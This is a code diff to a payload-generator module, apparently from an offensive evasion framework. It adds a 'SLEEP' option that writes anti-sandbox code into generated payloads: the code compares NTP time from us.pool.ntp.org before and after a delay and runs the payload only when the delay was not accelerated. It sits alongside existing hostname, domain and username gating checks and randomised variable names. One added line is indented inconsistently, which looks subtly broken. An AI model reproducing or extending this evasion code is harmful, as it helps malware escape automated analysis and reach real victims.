@@ -48,7 +48,8 @@ class PayloadModule:
             "HOSTNAME"       : ["X", "Optional: Required system hostname"],
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
-            "USERNAME"       : ["X", "Optional: The required user account"]
+            "USERNAME"       : ["X", "Optional: The required user account"],
+            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
     def generate(self):
@@ -138,6 +139,29 @@ class PayloadModule:
             payload_code += '\t' * num_tabs_required + 'import getpass\n'
             payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
             payload_code += '\t' * num_tabs_required + 'if \'' + self.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+       if self.required_options["SLEEP"][0].lower() != "x":
+
+            rand_time_name = evasion_helpers.randomString()
+
+            payload_code += '\t' * num_tabs_required + 'from time import sleep\n'
+            payload_code += '\t' * num_tabs_required + 'from socket import AF_INET, SOCK_DGRAM\n'
+            payload_code += '\t' * num_tabs_required + 'import sys\n'
+            payload_code += '\t' * num_tabs_required + 'import datetime\n'
+            payload_code += '\t' * num_tabs_required + 'import time\n'
+            payload_code += '\t' * num_tabs_required + 'import socket\n'
+            payload_code += '\t' * num_tabs_required + 'import struct\n'
+            payload_code += '\t' * num_tabs_required + 'client = socket.socket(AF_INET, SOCK_DGRAM)\n'
+            payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
+            payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
+            payload_code += '\t' * num_tabs_required + rand_time_name + ' = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)\n'
+            payload_code += '\t' * num_tabs_required + 'sleep(' + self.required_options["SLEEP"][0] + ')\n'
+            payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
+            payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
+            payload_code += '\t' * num_tabs_required + 'if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - ' + rand_time_name + ').seconds >= ' + self.required_options["SLEEP"][0] + '):\n'
 
             # Add a tab for this check
             num_tabs_required += 1
